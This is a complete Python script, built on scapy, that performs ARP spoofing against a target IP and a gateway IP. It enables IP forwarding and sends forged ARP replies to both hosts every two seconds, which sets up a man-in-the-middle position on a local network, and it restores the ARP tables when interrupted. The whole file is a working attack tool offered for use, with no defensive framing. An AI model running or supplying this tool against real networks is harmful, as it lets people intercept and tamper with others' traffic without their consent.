#!/usr/bin/python

import scapy.all as scapy
import optparse
import os
import sys
import time
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t","--target",dest="target",help="Target IP")
    parser.add_option("-s", "--source", dest="gateway", help="Gateway IP")
    (options,arguments)=parser.parse_args()
    return options

def get_mac(ip):
    arp_request=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast=broadcast/arp_request
    answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    if not answered_list:
        return None
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)
def restore(destination_ip,source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
option=get_arguments()
target_ip=option.target
gateway_ip=option.gateway

try:
    count_packet=0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        count_packet += 2
        print("\r[+] Sent: "+ str(count_packet))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Detected CTRL + C ...... Resetting ARP tables....... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
